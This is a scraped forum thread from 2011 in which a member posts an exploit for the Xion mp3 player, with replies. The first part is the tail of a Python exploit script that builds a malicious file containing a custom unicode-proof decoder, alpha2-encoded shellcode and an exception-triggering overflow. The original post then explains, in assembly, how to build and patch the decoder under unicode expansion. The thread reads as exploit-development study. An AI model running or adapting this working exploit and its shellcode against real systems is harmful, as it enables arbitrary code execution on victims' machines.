\r\nbuf+=”x45&#8243;\r\nbuf+=”x05x02xff” #add eax,0xff000100\r\nbuf+=”x45&#8243;\r\nbuf+=”xb9x70xee” #mov ecx,0xee001400 \r\nbuf+=”x45&#8243;\r\nbuf+=”xb0&#8243; #mov al,0×0\r\nbuf+=”x46&#8243; #inc esi , just a nop coz add al,ch is 00 e8\r\nbuf+=”xe8&#8243; #add al,ch\r\nbuf+=”x45&#8243;\r\n#eax points to start of buffer\r\n#setup ebx-&gt;0×0 ecx-&gt;0×500(size of shellcode)\r\nbuf+=”x6a” #push 0×0\r\nbuf+=”x5b” #pop ebx\r\nbuf+=”x45&#8243;\r\nbuf+=”x6a” #push 0×0\r\nbuf+=”x59&#8243; #pop ecx\r\nbuf+=”x45&#8243;\r\nbuf+=”xbax07xaa” #mov edx,0xaa000500\r\nbuf+=”x45&#8243;\r\nbuf+=”x46&#8243; #inc esi / just a nop coz mov ch,dl assembles as 00 f5\r\nbuf+=”xf5&#8243; #add ch,dh\r\nbuf+=”x45&#8243;\r\n“”&quot;\r\npatch decoder\r\nAssume eax points to the 43 ie first byte of the decoder!!\r\nprob: cant use 0x8a / 0×88 directly!! thinking about add byte ptr [eax],dh / inc byte [eax] (unicode proof)\r\nAssume eax points to the 1st byte of decoder buffer that has to be patched\r\n“”&quot;\r\nbuf+=”x40&#8243; #inc eax\r\nbuf+=”x45&#8243;\r\n\r\n#decoder : 43 8A 14 58 88 14 18 E2 F7\r\n#user buffer 43 14 81 18 f7\r\nbuf+=”xc6x81&#8243; #mov byte [eax],0×81\r\nbuf+=”x45&#8243;\r\n#Now we need to increment [eax] by 9 , inc byte [eax] assembles as FE 00 \r\nbuf+=”xfe” *9 #Writes 0x8a\r\nbuf+=”x40&#8243;#inc eax\r\nbuf+=”x45&#8243;\r\nbuf+=”x40&#8243;#inc eax\r\nbuf+=”x45&#8243;\r\nbuf+=”xc6x58&#8243; # mov byte [eax],0×58\r\nbuf+=”x45&#8243;\r\nbuf+=”x40&#8243;#inc eax\r\nbuf+=”x45&#8243;\r\n#Patching the 0×88, make sure 0×81 is present at that place (userbuffer)\r\nbuf+=”xfe” *7\r\nbuf+=”x40&#8243;#inc eax\r\nbuf+=”x45&#8243;\r\nbuf+=”xc6x14&#8243; #mov byte [eax],0×14\r\nbuf+=”x45&#8243;\r\nbuf+=”x40&#8243;#inc eax\r\nbuf+=”x45&#8243;\r\nbuf+=”x40&#8243;#inc eax\r\nbuf+=”x45&#8243;\r\nbuf+=”xc6xe2&#8243; #mov byte [eax],0xe2\r\nbuf+=”x45&#8243;\r\nbuf+=”x40&#8243;#inc eax\r\nbuf+=”x45&#8243;\r\nbuf+=”x40&#8243;#inc eax\r\nbuf+=”x45&#8243; # makes eax point to the start of the unicode expanded sc\r\nbuf+=”x40&#8243;#inc eax\r\nbuf+=”x45&#8243;\r\nbuf+=”x40&#8243;#inc eax\r\nbuf+=”x45&#8243;\r\nbuf+=”x40&#8243;#inc eax\r\nbuf+=”x45&#8243;\r\nbuf+=”x04x04&#8243; #nops , add al,0×0\r\n\r\n#decoder buffer ,this is where eax must point to in the first place\r\nbuf+=”x04&#8243; #add al,0×0 , this will act as nop\r\n#decoder : 43 8A 14 58 88 14 18 E2 F7\r\nbuf+=”x43x14x81x18xf7&#8243;\r\n#decoder\r\nbuf+=”x45&#8243; #align\r\n#shellcode ..thanks skylined for alpha2\r\n# This is not unicode proof shellcode , just uppercase #shellcode,decoder will auto”magic”ally patch unicode to ascii\r\nbuf+=(“PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIYKO8NZYZM47R4TXYRTQ4JTQO6QO9NQPVLCO74DFQPWTT5SV7INC6HWKXVVPOB821XF6PJ0ZTL7SRYV3MOUNRLLXP1UVXYPO0IN0LXMKWPWKJFK8I589ZJSK5NJPLMXXWKNNNX1R7L3NOJVQZKKM2NOEQ9922YK0TT14R4K8SO9RL6NWTOMIVVQ2U2MQLT92M4FWJ0ZLLXKQHY6O7CPOZQLXVOPM2MMM8LLOYNCITS1X3KTM3L9XFUNDPMTHPKTBJF264KI8M4QXNXYZLJVMYOZKSNSINJUKWQRVRLN5LXONU71MELKLQ75KM0HOKIL1KGOO4WOS3KPCPPKY6KETS4VNO7JVNOYVOQDVYYJUMKKLQD4VN2TWLK2PQNOJXULNLPOKI6URKEKOYFMQJVCGRNNE3KFKUKNXKY80ENONK5HFNOU131W0NXFM9KN0HUX9YF37OU9JMQRM3KTTK4NDKOQK4OVM9J6ULPQ4QKMVPHJK5PI1OHLNJQYT5SO36KQENDK0DVV7NDL71EN1Y6U32XTWWZTH2KY2MRNV6CKZJRNDQE0OUWIT6V6OLNOSZO14VHM46MGPQF5NMSTQOV410HPCKPFKL9I9WGB0PLLLQJLTVSVPPG6YQ8UFZDNJ4DUKMQXLYRSLK84WXWZXJ8KMUOJ8ZNTKKPZQ42ONXRKROVMKYJ***OTNKSYO9TSZOLWPJLQLPU362HPZ5WXN4UYKTWQNQVM1K1QLPA”)\r\n#trigger the exception\r\nbuf+=”E” * 5000\r\nfd.write(buf)\r\n\r\nprint “File is created successfully”</pre>\r\n</div>\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				<!-' + '- edit note -' + '->\r\n				<blockquote class="postcontent lastedited">\r\n					\r\n						Last edited by sebas_phoenix; 10-27-2011 at <span class="time">12:59 AM</span>.\r\n					\r\n					\r\n				</blockquote>\r\n				<!-' + '- / edit note -' + '->\r\n				\r\n				\r\n				\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_6137" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_6137" class="newreply" href="newreply.php?do=newreply&amp;p=6137" rel="nofollow" title="Reply With Quote"><img id="quoteimg_6137" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
pd[6143] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_6143">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">10-26-2011,&nbsp;<span class="time">02:39 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post6143" href="showthread.php?t=1644&amp;p=6143&amp;viewfull=1#post6143" class="postcounter">#2</a><a id="postcount6143" name="2"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=8" title="fb1h2s is offline"><strong>fb1h2s</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=8" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=8&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=8" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=8" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="http://Garage4Hackers.com" class="siteicon_homepage">\r\n				Visit Homepage\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/8-fb1h2s" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="fb1h2s is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Researcher\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_6143_8" title="fb1h2s has a spectacular aura about">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=8" title="fb1h2s is offline">\r\n				<img src="image.php?u=8&amp;dateline=1400680840" alt="fb1h2s\'s Avatar" title="fb1h2s\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					<dt>Location</dt> <dd>India</dd>\r\n					\r\n					<dt>Posts</dt> <dd>616</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=8">32</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_6143">\r\n						<blockquote class="postcontent restore ">\r\n							Hey could u provide the reference to tht phark article and if possible a download link to the application . That will help if trying this out ,thanks fro the great post .\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer">Hacking Is a Matter of Time Knowledge and Patience</div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_6143" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_6143" class="newreply" href="newreply.php?do=newreply&amp;p=6143" rel="nofollow" title="Reply With Quote"><img id="quoteimg_6143" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
pd[6144] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_6144">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">10-26-2011,&nbsp;<span class="time">03:18 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post6144" href="showthread.php?t=1644&amp;p=6144&amp;viewfull=1#post6144" class="postcounter">#3</a><a id="postcount6144" name="3"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=174" title="sebas_phoenix is offline"><strong>sebas_phoenix</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=174" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=174&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=174" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=174" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/174-sebas_phoenix" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="sebas_phoenix is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Garage Member\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_6144_174" title="sebas_phoenix will become famous soon enough">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Sep 2010</dd>\r\n					<dt>Location</dt> <dd>Chennai</dd>\r\n					\r\n					<dt>Posts</dt> <dd>83</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=174">1</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_6144">\r\n						<blockquote class="postcontent restore ">\r\n							<div class="bbcode_container">\r\n	<div class="bbcode_quote">\r\n		<div class="quote_container">\r\n			<div class="bbcode_quote_container"></div>\r\n			\r\n				<div class="bbcode_postedby">\r\n					<img src="images/misc/quote_icon.png" alt="Quote" /> Originally Posted by <strong>fb1h2s</strong>\r\n					<a href="showthread.php?p=6143#post6143" rel="nofollow"><img class="inlineimg" src="images/buttons/viewpost-right.png" alt="View Post" /></a>\r\n				</div>\r\n				<div class="message">Hey could u provide the reference to tht phark article and if possible a download link to the application . That will help if trying this out ,thanks fro the great post .</div>\r\n			\r\n		</div>\r\n	</div>\r\n</div>Phrack Link:<a href="http://www.phrack.org/issues.html?issue=61&amp;id=11" target="_blank">.:: Phrack Magazine ::.</a><br />\r\n And this is the vulnerable app in Corelan\'s tut-7(i downloaded a local copy on his website, need to login first to download , tats why am not providin link here) . Corelancoder would have used alpha2 unicode proof shellcode to write that exploit, I used a custom one, tats the only difference.\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_6144" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_6144" class="newreply" href="newreply.php?do=newreply&amp;p=6144" rel="nofollow" title="Reply With Quote"><img id="quoteimg_6144" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
pd[6435] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_6435">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">11-24-2011,&nbsp;<span class="time">08:58 AM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post6435" href="showthread.php?t=1644&amp;p=6435&amp;viewfull=1#post6435" class="postcounter">#4</a><a id="postcount6435" name="4"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=61" title="&quot;vinnu&quot; is offline"><strong>&quot;vinnu&quot;</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=61" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=61&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=61" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=61" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/61-quot-vinnu-quot" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="&quot;vinnu&quot; is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Researcher\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_6435_61" title="&quot;vinnu&quot; is a jewel in the rough">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=61" title="&quot;vinnu&quot; is offline">\r\n				<img src="image.php?u=61&amp;dateline=1311230253" alt="&quot;vinnu&quot;\'s Avatar" title="&quot;vinnu&quot;\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>271</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=61">4</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_6435">\r\n						<blockquote class="postcontent restore ">\r\n							Really the hard part in this kind of exploitation is to control the unicodization of the shellcode. But if no direct method is available prior to shellcod execution thena decoder is needed for removing the 00 butes. And the example you have shown here very well explains the method. Good job. Keep the spirit at its highest.<br />\r\n<br />\r\n<br />\r\n...&quot;vinnu&quot;\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_6435" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_6435" class="newreply" href="newreply.php?do=newreply&amp;p=6435" rel="nofollow" title="Reply With Quote"><img id="quoteimg_6435" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';

// next/previous post info
pn[6137] = "6435,6143";
pn[0] = ",6137";
pn[6143] = "6137,6144";
pn[6144] = "6143,6435";
pn[6435] = "6144,6137";

// cached usernames
pu[0] = guestphrase;
pu[174] = "sebas_phoenix";
pu[8] = "fb1h2s";
pu[61] = "&quot;vinnu&quot;";

// -->
</script>


<div id="threaded_view">
	<h4>Threaded View</h4>

	<div id="posttree">
		<script type="text/javascript">
		<!--
			writeLink(6137, 0, 0, 174, "", "Exploiting Xion mp3 player -" + "-...", "10-26-2011", "06:43 AM", 0, "showthreade63b.html?t=1644&amp;p=6137#post6137");
  writeLink(6143, 0, 0, 8, "T", "<i>Hey could u provide the...</i>", "10-26-2011", "02:39 PM", 0, "showthread7f5c-2.html?t=1644&amp;p=6143#post6143");
    writeLink(6144, 0, 0, 174, "I,L", "<i>Phrack Link:.:: Phrack...</i>", "10-26-2011", "03:18 PM", 0, "showthreadcbe9-2.html?t=1644&amp;p=6144#post6144");
  writeLink(6435, 0, 0, 61, "L", "<i>Really the hard part in this...</i>", "11-24-2011", "08:58 AM", 0, "showthreadb7ba.html?t=1644&amp;p=6435#post6435");

		//-->
		</script>
	</div>
</div>
	

	
		<ol class="posts" id="posts" start="1">
			
<li class="postbitlegacy postbitim postcontainer old" id="post_6137">
<!-- see bottom of postbit.css for .userinfo .popupmenu styles -->

	<div class="posthead">
			<span class="postdate old">
				
					<span class="date">10-26-2011, <span class="time">06:43 AM</span></span>
				
			</span>
			<span class="nodecontrols">
				
					<a class="postcounter" href="showthread9a3b.html?t=1644&amp;p=6137&amp;viewfull=1#post6137" name="post6137">#1</a><a id="postcount6137" name="1"></a>
				
				
				
			</span>
	</div>
	<div class="postdetails">
		<div class="userinfo">
			<div class="username_container">
			
				<div class="popupmenu memberaction">
	<a class="username offline popupctrl" href="member0d06.html?u=174" title="sebas_phoenix is offline"><strong>sebas_phoenix</strong></a>
	<ul class="popupbody popuphover memberaction_body">
		<li class="left">
			<a class="siteicon_profile" href="member0d06.html?u=174">
				View Profile
			</a>
		</li>
		
		<li class="right">
			<a class="siteicon_forum" href="search8cab.html?do=finduser&amp;userid=174&amp;contenttype=vBForum_Post&amp;showposts=1" rel="nofollow">
				View Forum Posts
			</a>
		</li>
		
		
		<li class="left">
			<a class="siteicon_message" href="private0a04.html?do=newpm&amp;u=174" rel="nofollow">
				Private Message
			</a>
		</li>
		
		
		
		<li class="right">
			<a class="siteicon_blog" href="blog0d06.html?u=174" rel="nofollow">
				View Blog Entries
			</a>
		</li>
		
		
		
		
		
		<li class="right">
			<a class="siteicon_article" href="list3dbb.html?r=author/174-sebas_phoenix" rel="nofollow">
				View Articles
			</a>
		</li>
		

		

		
		
	</ul>
</div>
				<img alt="sebas_phoenix is offline" border="0" class="inlineimg onlinestatus" src="images/statusicon/user-offline.png"/>

			
			</div>
			<span class="usertitle">
				Garage Member
			</span>
			
			
			
				<span class="postbit_reputation" id="repdisplay_6137_174" title="sebas_phoenix will become famous soon enough">
					
						<img alt="" class="repimg" src="images/reputation/reputation_pos.png"/>
					
				</span>
			
			 
			
				<hr/>
				<dl class="userinfo_extra">
					<dt>Join Date</dt> <dd>Sep 2010</dd>
					<dt>Location</dt> <dd>Chennai</dd>
					
					<dt>Posts</dt> <dd>83</dd>	
					<dt>Blog Entries</dt><dd><a href="blog0d06.html?u=174">1</a></dd>
				</dl>
				
				
				<div class="imlinks">
					    
				</div>
			
		</div>
		<div class="postbody">
			<div class="postrow has_after_content">
				
				
				<h2 class="title icon">
					Exploiting Xion mp3 player -- Using custom unicode decoder
				</h2>
				


						
						
				<div class="content">
					<div id="post_message_6137">
						<blockquote class="postcontent restore">
							Finally after two days, i could convert the information given by <b>obscou</b> in his awesome phrack article to build a custom unicode decoder and exploited Xion mp3 player. I have included my notes too (based on obscou’s article). One minor modification to be made is that obscou uses 0x8a,0×88 in his decoder but they will get translated to two entirely different bytes, I overcame that issue<b>(Please check comments in the exploit code for that)<br/>
</b><br/>
//Notes<br/>
<br/>
<b>//Setting a value in eax say 0xaabbccdd<br/>
</b><br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:120px;">mov eax,0xaa00bb00 ;note in unicode we can control 2 out of 4 bytes
push eax
dec esp ;esp points to 0x00bb00?? [?? refers to any byte]
pop eax
add eax,0xaa00cc00 ; eax contains 0xaabbcc??
mov al,0×0 ;eax contains 0xaabbcc00
mov ecx,0xaa00dd00
add al,ch ;eax contains 0xaabbccdd</pre>
</div><b>//setting a 0×00 byte in a dword for ex setting eax=0x00bbccdd</b><br/>
<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:132px;">mov eax,0xaa00bb00
push eax
dec esp
pop eax ;eax contains 0x00bb00??
mov ecx,0xaa00cc00
add ah,ch ;eax contains 0x00bbcc??
mov al,0×0 ;eax contains 0x00bbcc00
mov ecx,0xaa00dd00
add al,ch ; eax contains 0x00bbccdd</pre>
</div><b>//setting eax=0xaa00ccdd</b> -very simple [A little more optimized than phrack paper... they set eax as 0x00000000 and repeat the steps..]<br/>
<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:60px;">mov eax,0xaa00cc00
mov ecx,0xbb00dd00
add al,ch ;eax contains 0xaa00ccdd</pre>
</div><b>//eax=0xaabb00dd — a little bit tricky</b><br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:168px;">mov eax,0xaa00bb00
push eax
dec esp
pop eax ;eax contains 0x00bb00??
add eax,0xaa00cc00 ;eax contains 0xaabbcc??
; now we need 0×00 instead of 0xcc , we know the maximum value that can be represented by a byte is
;0xff after that it will become 0×100 which when neglecting the carry bit becomes 0×00 , so instead of
;subtracting 0xcc from ah, we need to add 0xff-0xcc+1 to make ah=0
; 0×34=0xff-0xcc+1
mov ecx,0xaa003400
add ah,ch ;eax contains 0xaabb00??
;fill up the rest of the steps yourself!!</pre>
</div><b>// How to make this work??</b><br/>
It’s pretty simple, our shellcode will get expanded with a 0×00 between each valid byte of the shellcode, all we need to do is run a<br/>
<br/>
decoder loop [that is unicode proof] that will make the unicode expanded shellcode into the original shellcode<br/>
<br/>
the algo is pretty simple , assume eax points to shellcode, ebx –&gt; 0×0 , ecx –&gt;0×500 (size of shellcode)<br/>
<br/>
<b>//code ripped from obscou’s article</b><br/>
<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:84px;">label:
inc ebx
mov byte dl,[eax+2*ebx]
mov byte [eax+ebx],dl
loop label ;ecx acts as a counter register!!</pre>
</div>This is not unicode proof..If we manage to make it unicode proof , then we win!<br/>
<br/>
//Inorder to make single byte opcodes unicode compatible, we need opcodes of form 00??00<br/>
We can use <b>add [ebp+0x0],al which assembles as 00 45 00</b><br/>
<br/>
<b>// Setting ebx – 0×0 and ecx – 0×500<br/>
</b><br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:120px;">push dword 0×00000000 ;6a 00
push dword 0×00000000 ;6a 00
pop ebx ;5d
add [ebp+0x0],al ;00 45 00 .Note that ebp must contain a valid pointer to write the results
pop ecx ;59
add [ebp+0x0],al ;00 45 00
mov edx,0xaa000500 ; ba 00 05 00 aa
add ch,dh ; 00 f5 .ecx — 0×500</pre>
</div><b>//Patching the loop code</b><br/>
<br/>
the opcodes for the loop code is : 43 8A 14 58 88 14 18 E2 F7<br/>
<br/>
If we give the opcodes as 43 14 88 18 F7 , it gets expanded to<br/>
43 00 14 00 88 00 18 00 F7<br/>
<br/>
Assume eax points to the first null byte ,<br/>
<br/>
then we can patch using<br/>
<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:72px;">mov byte [eax] ,0x8a
inc eax
inc eax
mov byte [eax],0×58</pre>
</div>However this is not unicode proof..<br/>
<br/>
Can be made unicode proof using<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:108px;">add [ebp+0x0],al ; 00 45 00
mov byte [eax], 0x8a ; c6 00 8a
add [ebp+0x0],al ;00 45 00
inc eax ; 40
add [ebp+0x0],al ;00 45 00
inc eax
add [ebp+0x0],al ;00 45 00</pre>
</div>and so on till we patch the entire decoder loop.<br/>
<br/>
and then we need to increment eax by 1 to make it point to our decoder loop that will decode<br/>
the unicode expanded shellcode to original shellcode.<br/>
<br/>
